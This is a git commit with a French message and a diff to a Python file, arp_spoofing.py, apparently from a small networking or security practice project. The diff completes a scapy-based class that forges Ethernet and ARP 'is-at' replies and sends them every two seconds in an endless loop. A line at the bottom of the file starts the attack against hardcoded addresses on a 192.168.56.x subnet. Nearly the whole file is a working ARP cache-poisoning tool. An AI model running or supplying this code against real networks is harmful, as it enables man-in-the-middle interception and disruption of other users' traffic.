0ca63a7087e3f7179e7fe755b1870728b4731bbb
TeoHubert <teohubert00@gmail.com>
2025-11-17 16:32:02 +0100

    Implémentation de la méthode de spoofing ARP et ajout de la gestion des exceptions dans le processus de spoofing.

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 class ArpSpoofing:
     def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
@@ -8,14 +9,27 @@ class ArpSpoofing:
         self.mac_dst = mac_dst
         self.interface = interface
 
-    def start_spoofing(self):
-        pass
+    def spoof(self):
         # Créer un paquet ARP de type "is-at" (op=2) et l'envoyer
         # Fonctionnement à confirmer
-        packet = scapy.ARP(op=2)
-        packet.hwsrc = self.mac_src
-        packet.hwdst=self.mac_dst
-        packet.psrc=self.ip_src
-        packet.pdst=self.ip_dst
-        print(packet.show())
-        scapy.send(packet, iface=self.interface, verbose=False)
+        eth = scapy.Ether(dst=self.mac_dst, src=self.mac_src)
+        arp = scapy.ARP(op=2, hwsrc=self.mac_src, psrc=self.ip_src, hwdst=self.mac_dst, pdst=self.ip_dst)
+        packet = eth / arp
+        print(packet.summary())
+        scapy.sendp(packet, iface=self.interface, verbose=False)
+
+    def start_spoofing(self):
+        try:
+            while True:
+                self.spoof()
+                time.sleep(2)
+        except Exception as e:
+            print("Arrêt du spoofing ARP de "+self.ip_dst+" - "+str(e))
+    
+    def __str__(self):
+        return f"ArpSpoofing(ip_src={self.ip_src}, mac_src={self.mac_src}, ip_dst={self.ip_dst}, mac_dst={self.mac_dst}, interface={self.interface})"
+
+
+s = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
+print(s)
+s.start_spoofing()
